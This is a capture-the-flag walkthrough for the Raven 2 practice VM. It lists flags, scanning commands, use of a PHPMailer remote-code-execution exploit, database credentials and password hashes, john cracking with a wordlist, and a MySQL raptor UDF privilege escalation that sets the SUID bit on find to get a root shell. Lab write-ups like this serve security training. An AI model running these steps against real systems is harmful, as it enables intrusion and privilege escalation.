# Raven 2 

I do not take any credit for the scripts or codes used, other than my own modifications to make the scripts work for my environment.

#nano /etc/hosts

#Flags 
{
    "flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}"

    "flag2{6a8ed560f0b5358ecf844108048eb337}"

    "flag3{a0f568aa9de277887f37730d71520d9b}"

    "flag4{df2bc5e951d91581467bb9a2a8ff4425}"
};


#netdiscover -r 

#nmap -Pn -sS -A raven.local

#wpscan 
{
    /bin/wpscan --url raven.local/wordpress --force --wp-content-dir wp-content
};

#wget 
{
    http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png
};

#dirb 
{ 
    http://raven.local
};

#locale 
{
    /wordpress/wp-login.php

    /wordpress/wp-includes/
};

#User(s) Identified 
{
    "michael", "steven"
};

#http://raven.local/vendor/PATH

#/var/www/html/vendor/

{
    "flag1{a2c1f66d2b8051bd3a5874b5b6e43e21"
};

#Modify
{
    PHPMailer < 5.2.18 - Remote Code Execu | exploits/php/webapps/40974.py
};

#define
{
    ('DB_NAME', 'wordpress'); define('DB_USER', 'root'); define('DB_PASSWORD', 'R@v3nSecurity');
};

#python -c "import pty;pty.spawn('/bin/bash');"

#www-data@Raven:/home$ ls -alh

#mysql> 
{
    SELECT user_login, user_pass FROM wp_users;
    SELECT user_login, user_pass FROM wp_users;
    "michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0"
    "steven:$P$B6X3H3ykawf2oHuPsbjQiih5iJXqad."
    "cracked steven ("LOLLOL1")"
};

#john --wordlist=/root/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt hash.txt --fork=4

#www-data@Raven:/var/www$ cat flag2.txt 
{
    "flag2{6a8ed560f0b5358ecf844108048eb337}"
};

#www-data@Raven:/var/www/html$

#python -m SimpleHTTPServer 80

#use mysql;

#create table foo(line blob);

#insert into foo values(load_file('/tmp/raptor_udf2.so'));

#select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

#create function do_system returns integer soname 'raptor_udf2.so';

#select * from mysql.func;

#select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');

#select do_system('chmod u+s /usr/bin/find');

#\! sh

#find raptor -exec '/bin/bash' \;

#www-data@Raven:/var/www/html$ 
{
    find raptor -exec '/bin/sh' \;
};

#python -c "import pty;pty.spawn('/bin/sh');"

#cd /root

#ls

#flag4.txt

#cat flag4.txt 
{
                           
    "flag4{df2bc5e951d91581467bb9a2a8ff4425}"

    CONGRATULATIONS on successfully rooting RavenII

    I hope you enjoyed this second interation of the Raven VM
};

## Materials & Resources

1. Instructional Materials: https://github.com/rcantec/raven2-notes.git;
2. Resources; [OVA for Raven 2 VM] https://www.vulnhub.com/entry/raven-2,269/;
3. Rockyou.txt https://github.com/danielmiessler/SecLists
4. PHPMailer Exploit v1.0 https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html
5. local privilege escalation through MySQL; http://www.0xdeadbeef.info/exploits/raptor_udf.c ; https://www.exploit-db.com/exploits/1518

